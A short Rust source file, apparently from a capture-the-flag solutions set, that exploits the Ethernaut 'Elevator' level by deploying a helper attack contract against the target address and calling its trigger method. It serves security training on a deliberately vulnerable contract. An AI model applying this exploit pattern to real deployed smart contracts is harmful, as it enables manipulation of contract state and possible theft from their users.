use crate::abi::building_contract::BuildingContract;
use async_trait::async_trait;
use ctf::ethernaut::lvl11_elevator::*;
use ethers::prelude::*;

pub(crate) struct Exploit;

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &ctf::Actor,
    ) -> eyre::Result<()> {
        let hack_contract =
            BuildingContract::deploy(offender.to_owned(), target.address)?
                .send()
                .await?;
        hack_contract.gogo().send().await?;
        Ok(())
    }
}
